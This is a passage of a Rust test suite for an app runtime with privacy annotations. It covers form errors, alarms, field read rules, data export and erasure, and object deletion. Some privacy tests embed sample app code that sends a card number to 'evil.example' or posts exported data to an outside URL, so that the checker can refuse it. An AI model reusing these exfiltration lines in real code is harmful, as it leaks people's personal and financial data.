    let out = device.handle(2.0, Input::EffectDone { id: c1[0].0, ok: None, error: Some("Sorry, this slot was just taken".into()), field: None, unreachable: false });
    assert!(format!("{out:?}").contains("Sorry, this slot was just taken") && format!("{out:?}").contains("book-error"), "{out:?}");
    device.handle(2.1, Input::EffectDone { id: c2[0].0, ok: Some(Json::Null), error: None, field: None, unreachable: false });
    // After finishing, both items are ready again.
    assert_eq!(calls(&device.handle(3.0, ui("book-s2"))).len(), 1);
}

#[test]
fn a_form_shows_every_error_and_forgets_the_last_person_at_sign_out() {
    let ui = |id: &str, event: &str, value: Json| Input::Ui { target: Target::Id { id: id.into() }, event: event.into(), value, reply: None };
    let form = |device: &Runtime| device.inspect()["objects"].as_array().unwrap().iter().find(|o| o["object"] == "Form/profile").map(|o| o["state"].clone());
    // An error about a field the form does not show goes to the form.
    let src = PROFILE.replace("validName(f.value(\"name\", me.name))", "check(false, \"profile\", \"Save your profile first\")");
    let (mut device, _) = boot_as(&src, Shared::default(), 0.0, false);
    device.handle(0.5, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    let out = device.handle(1.0, ui("save", "onPress", Json::Null));
    assert!(format!("{out:?}").contains("Save your profile first") && format!("{out:?}").contains("form-error"), "{out:?}");

    // Ana sends, then signs out before the answer: Bo sees nothing of hers.
    let (mut device, _) = boot_as(PROFILE, Shared::default(), 0.0, false);
    device.handle(0.5, Input::Identity { user: Some("user:ana".into()), roles: Vec::new() });
    device.handle(1.0, ui("name", "onChange", json!("Ana")));
    let out = device.handle(1.1, ui("save", "onPress", Json::Null));
    assert!(out.iter().any(|o| matches!(o, Output::Effect { effect: Effect::Call { .. }, .. })), "{out:?}");
    let out = device.handle(2.0, Input::Identity { user: Some("user:bo".into()), roles: Vec::new() });
    let shown: Vec<&Output> = out.iter().filter(|o| matches!(o, Output::Patch { .. } | Output::Changed { .. } | Output::Error { .. })).collect();
    assert!(!format!("{shown:?}").contains("user:ana"), "nothing of hers on screen or saved: {shown:?}");
    assert!(form(&device).is_none_or(|f| f["error"] == json!("") && f["drafts"] == json!({})), "{:?}", form(&device));
}

#[test]
fn a_persons_own_data_goes_back_only_into_their_own_objects() {
    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| d.message.clone()).collect::<Vec<_>>().join("
")).unwrap_or_default();
    let customer = "@server @read(\"owner\") object Customer {
  @pii(\"contact\", \"booking\") name: string = \"\"
  @allow(\"owner\") save(name: string) { this.name = name }
";
    // A screen runs as the signed-in person: their own name back into their own record.
    assert_eq!(msg(&format!("{customer}}}
function App() {{
  const me = Customer.get(caller.id)
  return <Button id=\"s\" onPress={{() => me.save(me.name.trim())}}>Save</Button>
}}
")), "");
    assert_eq!(msg(PROFILE), "", "through a form too");
    // Into someone else's record, through a method, it is refused.
    let e = msg(&format!("{customer}  @allow(\"owner\") copy(to: string) {{ Customer.get(to).save(this.name) }}
}}
"));
    assert!(e.contains("may be about someone other than the owner"), "{e}");
}

#[test]
fn the_privacy_check_follows_tj_ui_and_the_apps_own_components() {
    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| d.message.clone()).collect::<Vec<_>>().join("\n")).unwrap_or_default();
    let account = "@server @read(\"owner\") object Account {\n  @pii(\"financial\", \"billing\") card: string = \"\"\n  @pii(\"contact\", \"account\") email: string = \"\"\n";
    // Through a form's drafts, personal data is still personal data.
    let e = msg(&format!("import {{ Form }} from \"tj:ui\"\n{account}  @allow(\"owner\") async leak() {{\n    const f = Form.get(\"x\")\n    f.set(\"c\", this.card)\n    await fetch(\"https://evil.example/?c=\" + f.value(\"c\", \"\"))\n  }}\n}}\n"));
    assert!(e.contains("reaches `Form.drafts`"), "{e}");
    // A component is followed with the props it is given.
    let e = msg(&format!("{account}}}\nfunction Leak(p: {{ c: string }}) {{\n  fetch(\"https://evil.example/\" + p.c)\n  return <Text>x</Text>\n}}\nfunction App() {{\n  const me = Account.get(caller.id)\n  return <Leak c={{me.card}} />\n}}\n"));
    assert!(e.contains("Account.card"), "{e}");
    // tj:ui is the app's own code, not a third party.
    let src = format!("import {{ Notice }} from \"tj:ui\"\nconst lawfulBasis = {{ billing: \"contract\", account: \"contract\" }}\n{account}  @allow(\"owner\") note(): any {{ return Notice({{ text: reveal(this.email, \"account\") }}) }}\n}}\n");
    assert_eq!(msg(&src), "");
    assert!(tj_core::facts(&src).transfers.is_empty(), "no transfer to tj:ui");
}

#[test]
fn tj_ui_fields_keep_their_label_and_show_errors_by_them() {
    let src = r#"import { Field, Notice } from "tj:ui"
object Draft {
  error: string = "A slot lasts 5 to 480 minutes"
}
function App() {
  const f = Draft.get("main")
  return <Column>
    <Field label="Length (minutes)" error={f.error} id="minutes">
      <Input id="new-minutes" type="number" value={30} />
    </Field>
    <Field label="Title" id="title"><Input id="new-title" value="Cut" /></Field>
    <Notice id="saved" text="Saved." kind="ok" />
    <Notice id="quiet" text={null} />
  </Column>
}
"#;
    let (_, out) = boot_as(src, Shared::default(), 0.0, false);
    let shown = format!("{out:?}");
    assert!(shown.contains("Length (minutes)") && shown.contains("Title"), "labels stay visible: {shown}");
    assert!(shown.contains("minutes-error") && shown.contains("A slot lasts 5 to 480 minutes") && shown.contains("#b00020"));
    assert!(!shown.contains("title-error"), "no error, no error text");
    assert!(shown.contains("#1b5e20") && !shown.contains("quiet"), "good news in green; an empty notice shows nothing");
    // The field's label names its control, for screen readers and agents.
    let create = patches(&out).into_iter().find(|op| matches!(op, PatchOp::Create { props, .. } if props.get("id") == Some(&json!("new-title")))).expect("the title input");
    let PatchOp::Create { props, .. } = create else { unreachable!() };
    assert_eq!(props.get("label"), Some(&json!("Title")));
}

#[test]
fn an_alarm_can_be_cancelled_by_its_handle_even_after_a_restart() {
    let src = r#"@server object Booking {
  reminder: number = 0
  sent: string[] = []
  book(at: number) { this.reminder = this.schedule(at, "remind", "first") }
  cancel(): boolean { return this.unschedule(this.reminder) }
  remind(what: string) { this.sent.push(what) }
}
"#;
    let store = Shared::default();
    let opts = || Options { server: true, render: false, ..Options::new(0.0, 7) };
    let mut rt = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), opts()).unwrap().0;
    call(&mut rt, 1.0, "Booking/b", "book", json!([1000])).unwrap();
    let handle = state(&mut rt, 2.0, "Booking/b")["reminder"].clone();
    assert!(handle.as_f64().unwrap() > 0.0);
    // After a restart the saved handle still names the same alarm.
    let mut rt = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), Options { now: 10.0, ..opts() }).unwrap().0;
    assert_eq!(state(&mut rt, 11.0, "Booking/b")["reminder"], handle);
    assert_eq!(call(&mut rt, 12.0, "Booking/b", "cancel", json!([])).unwrap(), json!(true));
    assert_eq!(call(&mut rt, 13.0, "Booking/b", "cancel", json!([])).unwrap(), json!(false), "already gone");
    rt.handle(5000.0, Input::Tick);
    assert_eq!(state(&mut rt, 5001.0, "Booking/b")["sent"], json!([]), "a cancelled alarm never runs");
    // One that is not cancelled runs once.
    call(&mut rt, 6000.0, "Booking/b", "book", json!([100])).unwrap();
    rt.handle(6200.0, Input::Tick);
    assert_eq!(state(&mut rt, 6201.0, "Booking/b")["sent"], json!(["first"]));
}

#[test]
fn keyed_alarms_replace_and_cancel_by_name_across_restarts() {
    let src = r#"@server object Booking {
  sent: string[] = []
  scheduleKeyed(key: string, ms: number, label: string) { this.schedule(key, ms, "remind", label) }
  schedulePlain(ms: number, label: string) { this.schedule(ms, "remind", label) }
  cancelByName(name: string): boolean { return this.unschedule(name) }
  remind(what: string) { this.sent.push(what) }
}
"#;
    let store = Shared::default();
    let opts = || Options { server: true, render: false, ..Options::new(0.0, 7) };
    let mut rt = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), opts()).unwrap().0;
    // Scheduling the same key twice replaces the earlier alarm.
    call(&mut rt, 1.0, "Booking/b1", "scheduleKeyed", json!(["rem", 1000, "old"])).unwrap();
    call(&mut rt, 2.0, "Booking/b1", "scheduleKeyed", json!(["rem", 2000, "new"])).unwrap();
    call(&mut rt, 3.0, "Booking/b1", "scheduleKeyed", json!(["other", 1500, "kept"])).unwrap();
    // Restart in between: keys persist.
    let mut rt = Runtime::boot(compile(src).unwrap(), Box::new(store.clone()), Options { now: 100.0, ..opts() }).unwrap().0;
    assert_eq!(call(&mut rt, 101.0, "Booking/b1", "cancelByName", json!(["other"])).unwrap(), json!(true));
    assert_eq!(call(&mut rt, 102.0, "Booking/b1", "cancelByName", json!(["other"])).unwrap(), json!(false));
    rt.handle(2_500.0, Input::Tick);
    assert_eq!(state(&mut rt, 2_501.0, "Booking/b1")["sent"], json!(["new"]));
    // Unkeyed alarms can also be cancelled by method name without keeping a handle field.
    call(&mut rt, 3_000.0, "Booking/b1", "schedulePlain", json!([1000, "drop"])).unwrap();
    assert_eq!(call(&mut rt, 3_001.0, "Booking/b1", "cancelByName", json!(["remind"])).unwrap(), json!(true));
    rt.handle(5_000.0, Input::Tick);
    assert_eq!(state(&mut rt, 5_001.0, "Booking/b1")["sent"], json!(["new"]));
}

const SLOTS: &str = r#"@server @read("anyone") object Slot {
  title: string = ""
  @allow("anyone") name(t: string) { this.title = t }
}
@server object Desk {
  titles: string[] = []
  look() { this.titles = Slot.all().filter(s => s.title !== "").map(s => s.title) }
}
"#;

#[test]
fn all_lists_a_class_from_storage_on_a_server_and_by_class_stream_on_a_device() {
    let store = Shared::default();
    let opts = || Options { server: true, render: false, ..Options::new(0.0, 7) };
    let mut rt = Runtime::boot(compile(SLOTS).unwrap(), Box::new(store.clone()), opts()).unwrap().0;
    for (id, t) in [("s2", "Shave"), ("s1", "Cut")] {
        call_as(&mut rt, 1.0, &format!("Slot/{id}"), "name", json!([t]), who("", &[])).unwrap();
    }
    // A fresh server finds them in storage, in id order.
    let mut rt = Runtime::boot(compile(SLOTS).unwrap(), Box::new(store.clone()), opts()).unwrap().0;
    call(&mut rt, 2.0, "Desk/main", "look", json!([])).unwrap();
    assert_eq!(state(&mut rt, 3.0, "Desk/main")["titles"], json!(["Cut", "Shave"]));

    // A device asks for the whole class, and the list fills as the server sends it.
    let src = format!("{SLOTS}\nfunction App() {{\n  return <Column>{{Slot.all().map(s => <Text key={{s.id}}>{{s.title}}</Text>)}}</Column>\n}}\n");
    let (mut device, out) = boot_as(&src, Shared::default(), 0.0, false);
    assert!(out.iter().any(|o| matches!(o, Output::Subscribe { object, .. } if object == "Slot/*")), "{out:?}");
    let out = device.handle(1.0, Input::Sync { object: "Slot/s9".into(), state: json!({ "title": "Beard" }), seq: Some(3) });
    assert!(format!("{out:?}").contains("Beard"), "a slot the device had never seen is shown: {out:?}");
    assert!(compile("@server object A {}\nobject B { f() { A.get(\"*\") } }").is_ok(), "compiles; `*` is refused when run");
}

const ROSTER: &str = r#"type Booker = { customer: string, name: string, at: number }
@server @read("staff") @retain("1d") object Roster {
  @pii("contact", "booking") @by("customer", "at") entries: Booker[] = []
  @allow("signedIn") add(name: string) { this.entries.push({ customer: caller.id, name, at: Date.now() }) }
}
"#;

#[test]
fn several_peoples_entries_are_exported_erased_and_kept_only_as_long_as_each_is_allowed() {
    let mut rt = server(ROSTER, false);
    call_as(&mut rt, 1.0, "Roster/main", "add", json!(["Ana"]), who("user:ana", &[])).unwrap();
    call_as(&mut rt, 2.0, "Roster/main", "add", json!(["Bo"]), who("user:bo", &[])).unwrap();
    // The roster is not one person's: nobody's erasure blanks it.
    assert!(!rt.export_subject("user:ana").unwrap().as_object().unwrap().contains_key("Roster/main"));
    assert_eq!(rt.export_subject("user:ana").unwrap()["Roster/main#entries"], json!([{ "customer": "user:ana", "name": "Ana", "at": 1 }]));
    // Staff, whom the rule admits, read the list; a tool sees it masked.
    let staff = rt.handle(3.0, Input::Get { object: "Roster/main".into(), reply: Some(1), caller: who("key:sam", &["staff"]) });
    assert!(format!("{staff:?}").contains("Ana") && format!("{staff:?}").contains("Bo"), "{staff:?}");
    let tool = rt.handle(3.0, Input::Get { object: "Roster/main".into(), reply: Some(2), caller: Some(Caller::trusted()) });
    assert!(!format!("{tool:?}").contains("Ana"), "{tool:?}");
    // Erasing ana takes her entries out, and only hers.
    let e = rt.erase_subject("user:ana", None).unwrap();
    assert!(e.erased.contains(&"Roster/main#entries".to_string()), "{:?}", e.erased);
    assert_eq!(rt.export_subject("user:bo").unwrap()["Roster/main#entries"][0]["name"], json!("Bo"));
    assert!(rt.export_subject("user:ana").unwrap().get("Roster/main#entries").is_none());
    // Each entry is kept for a day from its own time: the sweep takes bo's out after that.
    call_as(&mut rt, 50_000_000.0, "Roster/main", "add", json!(["Cy"]), who("user:cy", &[])).unwrap();
    rt.handle(86_400_000.0 + 10.0, Input::Tick);
    rt.handle(86_400_000.0 + 20.0, Input::Tick);
    let left = rt.handle(86_400_000.0 + 30.0, Input::Get { object: "Roster/main".into(), reply: Some(3), caller: who("key:sam", &["staff"]) });
    assert!(!format!("{left:?}").contains("\\\"Bo\\\"") && format!("{left:?}").contains("Cy"), "{left:?}");
}

#[test]
fn lists_of_several_peoples_entries_are_declared_where_they_can_be_checked() {
    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| format!("{} | {}", d.message, d.hint.clone().unwrap_or_default())).collect::<Vec<_>>().join("\n")).unwrap_or_default();
    assert_eq!(msg(ROSTER), "");
    assert!(msg("@server @read(\"staff\") object R {\n  @pii(\"contact\", \"b\") @by(\"customer\") names: string[] = []\n}\n").contains("needs names's entries to be records with `customer: string`"));
    assert!(msg("@server @read(\"anyone\") object R {\n  @pii(\"contact\", \"b\") @by(\"customer\") e: { customer: string }[] = []\n}\n").contains("cannot be read by anyone"));
    assert!(msg("@server @read(\"staff\") @retain(\"1d\") object R {\n  @pii(\"contact\", \"b\") @by(\"customer\") e: { customer: string }[] = []\n}\n").contains("each entry needs its own time"));
    assert!(msg("@server @read(\"staff\") object R {\n  @by(\"customer\") e: { customer: string }[] = []\n}\n").contains("fields take @pii"));
    // A copy of personal data is kept only where it is marked as personal data.
    let e = msg(&format!("{ROSTER}@server @read(\"staff\") object Cache {{\n  names: string[] = []\n}}\n@server @read(\"owner\") object P {{\n  @pii(\"contact\", \"booking\") name: string = \"\"\n  @allow(\"owner\") copy() {{ Cache.get(\"c\").names.push(reveal(this.name, \"booking\")) }}\n}}\n"));
    assert!(e.contains("is kept in `Cache.names`, where export and erasure cannot find whose it is") && e.contains("@by"), "{e}");
    // Marked @pii but not a @by list: export and erasure still could not find it.
    let e = msg(&format!("{ROSTER}@server @read(\"staff\") object Cache {{\n  @pii(\"contact\", \"booking\") names: string[] = []\n}}\n@server @read(\"owner\") object P {{\n  @pii(\"contact\", \"booking\") name: string = \"\"\n  @allow(\"owner\") copy() {{ Cache.get(\"c\").names.push(reveal(this.name, \"booking\")) }}\n}}\n"));
    assert!(e.contains("where export and erasure cannot find whose it is"), "{e}");
    // A personal field on a shared object's own method is no better: the slot is not the person.
    let e = msg("@server @read(\"owner\") object Profile {\n  @pii(\"contact\", \"booking\") name: string = \"\"\n}\n@server @read(\"anyone\") object Slot {\n  @pii(\"contact\", \"booking\") bookerName: string = \"\"\n  @allow(\"signedIn\") book() { this.bookerName = reveal(Profile.get(caller.id).name, \"booking\") }\n}\n");
    assert!(e.contains("is kept in `this.bookerName`, where export and erasure cannot find whose it is"), "{e}");
    // A device object may hold what the server revealed: it is cleared at sign-out.
    let e = msg("@server @read(\"owner\") object P {\n  @pii(\"contact\", \"booking\") name: string = \"\"\n  @allow(\"owner\") mine(): string { return reveal(this.name, \"booking\") }\n}\nobject Screen {\n  shown: string = \"\"\n  async load() { this.shown = await P.get(caller.id).mine() }\n}\n");
    assert_eq!(e, "", "a device object may show it");
    let mixed = |rest: &str| msg(&format!("@server @read(\"staff\") object R {{
  @pii(\"contact\", \"b\") @by(\"customer\") e: {{ customer: string }}[] = []
{rest}}}
"));
    assert!(mixed("  @pii(\"contact\", \"b\") phone: string = \"\"
").contains("mixes a list of several people's entries"));
    assert!(mixed("  @allow(\"owner\") f() {}
").contains("mixes a list of several people's entries"));
    // Entries are taken out of the list, or moved to another, without revealing them again.
    let moves = r#"type Booker = { customer: string, name: string, at: number }
@server @read("staff") object Roster {
  @pii("contact", "booking") @by("customer", "at") entries: Booker[] = []
  drop(slot: string) { this.entries = this.entries.filter(e => e.customer !== slot) }
  @allow("signedIn") first() { this.entries.splice(0, 1) }
  @allow("signedIn") park() { Waiting.get("w").entries.push(this.entries[0]) }
}
@server @read("staff") object Waiting {
  @pii("contact", "booking") @by("customer", "at") entries: Booker[] = []
}
@server @read("anyone") object Slot {
  @allow("signedIn") cancel() { const r = Roster.get("main"); r.drop(this.id); r.first(); r.park() }
}
"#;
    assert_eq!(msg(moves), "");
    // Anywhere else, the list's entries are still personal data about several people.
    let e = msg(&format!("{ROSTER}@server @read(\"staff\") object Log {{
  last: string = \"\"
  @allow(\"signedIn\") note() {{ this.last = Roster.get(\"r\").entries[0].name }}
}}
"));
    assert!(e.contains("reaches `this.last`"), "{e}");
}

const BOOKING: &str = r#"@server @read("anyone") object Slot {
  title: string = "Cut"
  @read("staff", "self") customer: string = ""
  @read("none") alarm: number = 0
  @allow("signedIn") book() { this.customer = caller.id; this.alarm = 7 }
}
@server @read("owner", "staff") object Customer {
  @pii("contact", "booking") @read("owner", "staff") name: string = ""
  @pii("contact", "booking") note: string = ""
  @allow("owner") save(name: string) { this.name = name; this.note = name }
}
"#;

#[test]
fn each_field_is_seen_by_the_readers_its_own_rule_names() {
    let mut rt = server(BOOKING, false);
    let mut n = 0;
    let mut get = |rt: &mut Runtime, object: &str, caller: Option<Caller>| {
        n += 1;
        let out = rt.handle(2.0, Input::Get { object: object.into(), reply: Some(n), caller });
        out.into_iter().find_map(|o| if let Output::Reply { ok, .. } = o { ok } else { None }).unwrap()
    };
    // Open slot: "self" field is "" for everyone so it shows as open.
    assert_eq!(get(&mut rt, "Slot/s1", who("user:bo", &[])), json!({ "title": "Cut", "customer": "", "alarm": 0 }));
    call_as(&mut rt, 1.0, "Slot/s1", "book", json!([]), who("user:ana", &[])).unwrap();
    call_as(&mut rt, 1.0, "Customer/user:ana", "save", json!(["Ana"]), who("user:ana", &[])).unwrap();
    // Booked slot: others see "•••" (booked, without identity); staff and ana see "user:ana".
    // @read("none") stays at its default even for staff, while tools still see it.
    assert_eq!(get(&mut rt, "Slot/s1", who("", &[])), json!({ "title": "Cut", "customer": "•••", "alarm": 0 }));
    assert_eq!(get(&mut rt, "Slot/s1", who("user:bo", &[])), json!({ "title": "Cut", "customer": "•••", "alarm": 0 }));
    assert_eq!(get(&mut rt, "Slot/s1", who("user:ana", &[])), json!({ "title": "Cut", "customer": "user:ana", "alarm": 0 }));
    assert_eq!(get(&mut rt, "Slot/s1", who("key:sam", &["staff"])), json!({ "title": "Cut", "customer": "user:ana", "alarm": 0 }));
    // Staff see the customer's current name, as the field's rule says, and not the rest.
    assert_eq!(get(&mut rt, "Customer/user:ana", who("key:sam", &["staff"])), json!({ "name": "Ana", "note": "•••" }));
    assert_eq!(get(&mut rt, "Customer/user:ana", who("user:ana", &[])), json!({ "name": "Ana", "note": "Ana" }));
    // Tools see what is not personal data.
    assert_eq!(get(&mut rt, "Customer/user:ana", Some(Caller::trusted())), json!({ "name": "•••", "note": "•••" }));
    assert_eq!(get(&mut rt, "Slot/s1", Some(Caller::trusted()))["alarm"], json!(7));

    // A field naming a person is theirs to export and erase; erasing reopens the slot for everyone.
    assert_eq!(rt.export_subject("user:ana").unwrap()["Slot/s1#customer"], json!("user:ana"));
    let e = rt.erase_subject("user:ana", None).unwrap();
    assert!(e.erased.contains(&"Slot/s1#customer".to_string()), "{:?}", e.erased);
    assert_eq!(get(&mut rt, "Slot/s1", who("key:sam", &["staff"]))["customer"], json!(""));
    assert_eq!(get(&mut rt, "Slot/s1", who("user:bo", &[]))["customer"], json!(""));
}

#[test]
fn a_fields_rule_is_checked_where_it_is_written() {
    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| format!("{} | {}", d.message, d.hint.clone().unwrap_or_default())).collect::<Vec<_>>().join("
")).unwrap_or_default();
    assert_eq!(msg(BOOKING), "");
    assert!(msg("object S {
  @read(\"staff\") n: number = 0
}
").contains("nobody outside the server does"));
    assert!(msg("@server object S {
  @read(\"staff\") n: number = 0
}
").contains("nobody outside the server does"));
    assert!(msg("@server @read(\"anyone\") object S {
  @read(\"self\") n: number = 0
}
").contains("needs a `string`"));
    assert!(msg("@server @read(\"owner\", \"staff\") object S {
  @pii(\"contact\", \"b\") @read(\"anyone\") n: string = \"\"
}
").contains("cannot be read by anyone"));
    assert!(msg("@server @read(\"owner\") object S {
  @pii(\"contact\", \"b\") @read(\"owner\", \"staff\") n: string = \"\"
}
").contains("\"staff\" cannot read S at all"));
    assert!(msg("@server @read(\"staff\") object S {
  @read(\"self\") c: string = \"\"
}
").contains("the person it names cannot read S at all"));
    assert!(msg("@server @read(\"self\") object S {
  c: string = \"\"
}
").contains("is for a field's @read"));
    assert!(msg("@server @read(\"anyone\") object S {
  @read(\"staff\") @read(\"staff\") c: string = \"\"
}
").contains("unknown or repeated field decorator @read"));
    assert!(msg("@server @read(\"none\") object S {
  c: string = \"\"
}
").contains("\"none\" is for a field's @read"));
    assert!(msg("@server @read(\"anyone\") object S {
  @read(\"none\", \"staff\") c: string = \"\"
}
").contains("\"none\" cannot be combined"));
}

#[test]
fn device_screen_may_display_own_export_without_reveal_but_cannot_leak_it() {
    let base = r#"import { exportData } from "tj:privacy"
@server @read("owner") object Account {
  @pii("contact", "booking") name: string = ""
  @pii("financial", "billing") card: string = ""
  @allow("owner") async mine(): any { return await exportData(caller.id) }
}
"#;
    // Showing the signed-in person their own multi-purpose export in a device-local screen object
    // compiles without reveal, and records zero reveals.
    let ok = format!(
        "{base}object Screen {{
  myData: string = \"\"
  async load() {{ this.myData = JSON.stringify(await Account.get(caller.id).mine(), null, 2) }}
}}
function App() {{
  const s = Screen.get(\"main\")
  return <Column><Button onPress={{() => s.load()}}>Show</Button><Text>{{s.myData}}</Text></Column>
}}
"
    );
    assert!(compile(&ok).is_ok(), "{:?}", compile(&ok).err());
    assert!(tj_core::facts(&ok).reveals.is_empty());

    // Sending that device-local field to fetch is still caught by the flow check!
    let leak = format!(
        "{base}object Screen {{
  myData: string = \"\"
  async load() {{ this.myData = JSON.stringify(await Account.get(caller.id).mine(), null, 2) }}
  async leak() {{ await fetch(\"https://example.com\", {{ method: \"POST\", body: this.myData }}) }}
}}
"
    );
    let err = compile(&leak).err().expect("leak should be refused");
    assert!(err.iter().any(|d| d.message.contains("reaches `fetch`")), "{err:?}");

    // Someone else's data still cannot be stored on a device-local object without reveal,
    // and the hint does not tell you to add @pii to a device object.
    let other = format!(
        "{base}object Screen {{
  copy: string = \"\"
  grab(id: string) {{ this.copy = Account.get(id).name }}
}}
"
    );
    let err = compile(&other).err().expect("other person's data should be refused");
    assert!(err.iter().any(|d| d.message.contains("reaches `this.copy`") && !d.hint.as_deref().unwrap_or("").contains("@pii")), "{err:?}");
}

const SHELF: &str = r#"@server @read("anyone") object Slot {
  title: string = ""
  ticks: number = 0
  @allow("anyone") name(t: string) { this.title = t }
  @allow("anyone") remove(): string { const t = this.title; this.delete(); return t }
  @allow("anyone") later() { this.schedule(1000, "ring") }
  ring() { this.title = "rang" }
  @every("1s") tick() { this.ticks += 1 }
}
@server @read("anyone") object Desk {
  @allow("anyone") titles(): string[] { return Slot.all().map(s => s.title) }
  @allow("anyone") poke() { Slot.get("s1").delete() }
}
"#;

#[test]
fn a_deleted_object_leaves_its_class_its_replicas_and_its_timers() {
    let store = Shared::default();
    let (mut rt, _) = boot_as(SHELF, store.clone(), 0.0, true);
    let anyone = || who("", &[]);
    let titles = |rt: &mut Runtime, t: f64| call_as(rt, t, "Desk/d", "titles", json!([]), who("", &[])).unwrap();
    call_as(&mut rt, 1.0, "Slot/s1", "name", json!(["A"]), anyone()).unwrap();
    call_as(&mut rt, 1.0, "Slot/s2", "name", json!(["B"]), anyone()).unwrap();
    call_as(&mut rt, 1.0, "Slot/s1", "later", json!([]), anyone()).unwrap();
    // The method ends as written, and replicas are told with `null`.
    let remove = |reply: u64| Input::Call { object: "Slot/s1".into(), method: "remove".into(), args: Vec::new(), reply: Some(reply), call: Some("c-1".into()), caller: who("", &[]) };
    let out = rt.handle(2.0, remove(1));
    assert_eq!(reply(&out), Ok(json!("A")));
    assert!(out.iter().any(|o| matches!(o, Output::Changed { object, state: Json::Null, .. } if object == "Slot/s1")), "{out:?}");
    assert_eq!(titles(&mut rt, 3.0), json!(["B"]));
    // Its alarm and its timer went with it: neither brings it back.
    rt.handle(5_000.0, Input::Tick);
    assert_eq!(titles(&mut rt, 5_001.0), json!(["B"]));
    // A retried call is answered once, from its record.
    assert_eq!(reply(&rt.handle(5_002.0, remove(2))), Ok(json!("A")));
    // A class stream resuming from before learns of the deletion.
    let gone = |out: &[Output]| out.iter().any(|o| matches!(o, Output::Changed { object, state: Json::Null, .. } if object == "Slot/s1"));
    assert!(gone(&rt.changed_since(&["Slot/*".into()], 0)));
    // Still gone after a restart; written to again, it comes back.
    let (mut rt, _) = boot_as(SHELF, store, 6_000.0, true);
    assert_eq!(titles(&mut rt, 6_001.0), json!(["B"]));
    call_as(&mut rt, 6_002.0, "Slot/s1", "name", json!(["C"]), anyone()).unwrap();
    assert_eq!(titles(&mut rt, 6_003.0), json!(["C", "B"]));
    // Only an object's own methods delete it.
    let e = call_as(&mut rt, 6_004.0, "Desk/d", "poke", json!([]), anyone()).unwrap_err().1;
    assert!(e.contains("own methods"), "{e}");

    // The retention sweep leaves a deleted record alone, even with its call records.
    let note = "@server @read(\"owner\") @retain(\"1d\") object Note {
  text: string = \"\"
  @allow(\"owner\") write(t: string) { this.text = t }
  @allow(\"owner\") drop() { this.delete() }
}
";
    let notes = Shared::default();
    let (mut rt, _) = boot_as(note, notes.clone(), 0.0, true);
    call_as(&mut rt, 1.0, "Note/user:ana", "write", json!(["hi"]), who("user:ana", &[])).unwrap();
    rt.handle(2.0, Input::Call { object: "Note/user:ana".into(), method: "drop".into(), args: Vec::new(), reply: Some(1), call: Some("c-1".into()), caller: who("user:ana", &[]) });
    let (mut rt, _) = boot_as(note, notes.clone(), 3.0, true);
    for t in [3_700_000.0, 3_700_010.0, 3_700_020.0] {
        rt.handle(t, Input::Tick);
    }
    let kept = notes.0.borrow().data.get("Note/user:ana").cloned().unwrap();
    assert!(kept.contains("\"created\":0.0") && kept.contains("c-1"), "still deleted: {kept}");

    // A device drops a deleted replica, and does not keep it for next time.
    let src = format!("{SHELF}function App() {{\n  return <Column>{{Slot.all().map(s => <Text key={{s.id}}>{{s.title}}</Text>)}}</Column>\n}}\n");
    let kept = Shared::default();
    let (mut device, _) = boot_as(&src, kept.clone(), 0.0, false);
    let out = device.handle(1.0, Input::Sync { object: "Slot/s9".into(), state: json!({ "title": "Beard" }), seq: Some(3) });
    assert!(format!("{out:?}").contains("Beard"), "{out:?}");
    device.handle(2.0, Input::Sync { object: "Slot/s9".into(), state: Json::Null, seq: Some(4) });
    let (mut device, out) = boot_as(&src, kept, 3.0, false);
    assert!(!format!("{out:?}").contains("Beard"), "a deleted replica is not kept: {out:?}");
    // A deletion of something the device never held loads nothing.
    device.handle(4.0, Input::Sync { object: "Slot/zz".into(), state: Json::Null, seq: Some(9) });
    assert!(!device.inspect().to_string().contains("Slot/zz"));

    // Deleted while already at its defaults: replicas still hear of it.
    let (mut rt, _) = boot_as(note, Shared::default(), 0.0, true);
    call_as(&mut rt, 1.0, "Note/user:ana", "write", json!(["hi"]), who("user:ana", &[])).unwrap();
    call_as(&mut rt, 2.0, "Note/user:ana", "write", json!([""]), who("user:ana", &[])).unwrap();
    let out = rt.handle(3.0, Input::Call { object: "Note/user:ana".into(), method: "drop".into(), args: Vec::new(), reply: Some(1), call: None, caller: who("user:ana", &[]) });
    assert!(out.iter().any(|o| matches!(o, Output::Changed { state: Json::Null, .. })), "{out:?}");

    // Erased by retention while not loaded: replicas hear of it as a deletion too.
    let kept = Shared::default();
    let (mut rt, _) = boot_as(note, kept.clone(), 0.0, true);
    call_as(&mut rt, 1.0, "Note/user:ana", "write", json!(["hi"]), who("user:ana", &[])).unwrap();
    let (mut rt, _) = boot_as(note, kept, 2.0, true);
    let mut out = Vec::new();
    for t in [86_400_100.0, 86_400_110.0, 86_400_120.0] {
        out.extend(rt.handle(t, Input::Tick));
    }
    assert!(out.iter().any(|o| matches!(o, Output::Changed { object, state: Json::Null, .. } if object == "Note/user:ana")), "{out:?}");
}

#[test]
fn personal_data_shown_to_other_readers_stays_one_persons_and_needs_no_consent() {
    let msg = |src: &str| compile(src).err().map(|e| e.iter().map(|d| d.message.clone()).collect::<Vec<_>>().join("\n")).unwrap_or_default();
    // On a shared object, a person's field would be out of reach of export and erasure.
    let e = msg("@server @read(\"staff\") object Slot {\n  @pii(\"contact\", \"booking\") @read(\"staff\") phone: string = \"\"\n}\n");
    assert!(e.contains("one person's data, so its readers include \"owner\""), "{e}");
    // Held only with consent: shown to others only through reveal, where consent is checked.
    let consented = "const lawfulBasis = { marketing: \"consent\" }\n@server @read(\"owner\", \"staff\") object Member {\n  @pii(\"contact\", \"marketing\") @read(\"owner\", \"staff\") email: string = \"\"\n}\n";
    assert!(msg(consented).contains("rests on consent"), "{}", msg(consented));
    assert_eq!(msg(&consented.replace("\"consent\"", "\"contract\"")), "");
}

#[test]
fn a_class_stream_resumes_with_the_newest_changes_and_starts_over_for_a_new_user() {
    // Over the cap, catching up keeps the most recent changes, whatever the ids.
    let mut rt = server(SLOTS, false);
    for i in 0..1005 {
        call_as(&mut rt, 1.0 + i as f64, &format!("Slot/s{:04}", 1005 - i), "name", json!(["x"]), who("", &[])).unwrap();
    }
